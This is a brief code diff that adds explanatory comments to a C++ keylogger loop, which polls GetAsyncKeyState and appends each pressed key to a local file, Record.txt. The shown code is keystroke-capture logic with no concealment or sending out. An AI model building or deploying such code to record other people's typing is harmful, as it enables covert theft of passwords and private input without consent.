@@ -24,6 +24,8 @@ int main(void) {
                 i.e.; 32767
             */
             if (GetAsyncKeyState(character) == -32767) {
+                // GetAsyncKeyState checks if a specific key was pressed.
+                // -32767 indicates a key press event.
                 std::ofstream write("Record.txt", std::ios::app);  // ios::app ensures that the file is opened in append mode.
                 write << character;
                 write.close(); // closing the file.
